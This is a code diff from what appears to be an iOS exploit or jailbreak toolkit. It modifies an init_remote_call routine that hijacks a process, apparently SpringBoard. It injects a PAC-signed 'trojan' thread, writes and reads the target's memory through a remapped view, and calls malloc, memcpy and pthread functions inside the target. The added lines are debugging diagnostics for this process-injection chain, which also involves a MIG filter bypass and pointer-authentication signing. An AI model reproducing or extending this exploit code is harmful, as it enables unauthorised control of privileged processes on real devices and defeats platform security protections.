@@ -1759,12 +1759,14 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         return 0;
     }
 
-    // Fl0rk @ 0x100e61ff8..0x100e62004 + 0x100e60544..0x100e64dc4:
+    // Fl0rk @ 0x100e61ff8..004 / 0x100e60544..0x100e64dc4:
     //   out = (SP & 0x7fffffffff) - 0x100
-    //   signed = remote_pac(trojan, FAKE_PC_TROJAN=0x301, 0)
+    //   signed = remote_pac(trojan, 0x301, 0)
     //   pthread_create_suspended_np(out, 0, signed, 0)
-    //   remote_read(out, 8)   // helper 0x100e5967c
-    // Do NOT pre-read out (poisons VMShmem cache with zeros — DIAG false *out=0).
+    // 34c8d33 still *out=0 after dropping entry cache. Prior malloc out also
+    // remapped OUR writes but not create's. Split the fault:
+    //   canary DEAD via remote_write, then SB-side memcpy bounce to heap
+    //   (heap remap known-good) so we see what SB's MMU sees at out.
     uint64_t trapSP = (uint64_t)exc.threadState.__sp & 0x7fffffffffULL;
     uint64_t trojanMemTemp = trapSP - 0x100ULL;
     g_RC_vmMap = task_get_vm_map(g_RC_taskAddr);
@@ -1787,25 +1789,67 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         return -1;
     }
 
+    // Bounce buf on SB heap — remap of heap previously saw our stores.
+    uint64_t bounce = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
+    if (!g_RC_success || !bounce) {
+        RC_DIAG("malloc bounce failed");
+        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
+        return -1;
+    }
+    do_remote_call_temp(100, "memset", bounce, 0, 16, 0, 0, 0, 0, 0);
+
+    // Canary through OUR remap path (no SB CPU store yet).
+    const uint64_t kCanary = 0xDEADBEEFCAFEBABEULL;
+    if (!remote_write64(trojanMemTemp, kCanary)) {
+        RC_DIAG("canary remote_write FAILED");
+        do_remote_call_temp(100, "free", bounce, 0, 0, 0, 0, 0, 0, 0);
+        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
+        return -1;
+    }
+    clear_remote_shmem_cache();
+    uint64_t canaryRead = remote_read64(trojanMemTemp);
+    RC_DIAG("pre-create canary remap=0x%llx (expect DEADBEEFCAFEBABE)",
+            (unsigned long long)canaryRead);
+
+    // Fl0rk start_routine = PAC'd 0x301. Also try once is enough this build;
+    // canary+bounce tell us if create stores under SB MMU.
     uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
                                                 trojanMemTemp, 0, remoteCrashSigned, 0, 0, 0, 0, 0);
     if (!g_RC_success || createResult != 0) {
         RC_DIAG("pthread_create failed result=%llu success=%d",
                 (unsigned long long)createResult, (int)g_RC_success);
+        do_remote_call_temp(100, "free", bounce, 0, 0, 0, 0, 0, 0, 0);
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
 
-    // Drop shmem page cache (named-entry to old object). vm_map_find_entry also
-    // must not cache — COW after create splits entries (see VM.m).
     clear_remote_shmem_cache();
-    uint64_t pthreadAddr = remote_read64(trojanMemTemp);
-    RC_DIAG("post-pthread pthreadAddr=0x%llx out=0x%llx",
-            (unsigned long long)pthreadAddr, (unsigned long long)trojanMemTemp);
+    uint64_t pthreadAddrRemap = remote_read64(trojanMemTemp);
+
+    // SB-side copy: memcpy(bounce, out, 8) uses SpringBoard's own page tables.
+    do_remote_call_temp(100, "memcpy", bounce, trojanMemTemp, 8, 0, 0, 0, 0, 0);
+    clear_remote_shmem_cache();
+    uint64_t pthreadAddrBounce = remote_read64(bounce);
+    RC_DIAG("post-pthread remap=0x%llx bounce=0x%llx canaryWas=0x%llx out=0x%llx",
+            (unsigned long long)pthreadAddrRemap,
+            (unsigned long long)pthreadAddrBounce,
+            (unsigned long long)canaryRead,
+            (unsigned long long)trojanMemTemp);
+
+    uint64_t pthreadAddr = pthreadAddrBounce ? pthreadAddrBounce : pthreadAddrRemap;
+    do_remote_call_temp(100, "free", bounce, 0, 0, 0, 0, 0, 0, 0);
+
     if (!pthreadAddr) {
-        RC_DIAG("pthread out still 0 after caches cleared — create did not store?");
+        if (pthreadAddrRemap == kCanary || pthreadAddrBounce == kCanary) {
+            RC_DIAG("create ret=0 but out still CANARY — start_routine rejected, no store");
+        } else {
+            RC_DIAG("create ret=0 out=0 (not canary) — zeroed or unread");
+        }
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
+    }
+    if (pthreadAddrRemap == 0 && pthreadAddrBounce != 0) {
+        RC_DIAG("STACK REMAP BLIND — SB memcpy sees pthread, our remap does not");
     }
     uint64_t callThreadPort = do_remote_call_temp(100, "pthread_mach_thread_np", pthreadAddr, 0, 0, 0, 0, 0, 0, 0);
     RC_DEBUG("[%s:%d] callThreadPort: 0x%llx\n", __FUNCTION__, __LINE__, callThreadPort);
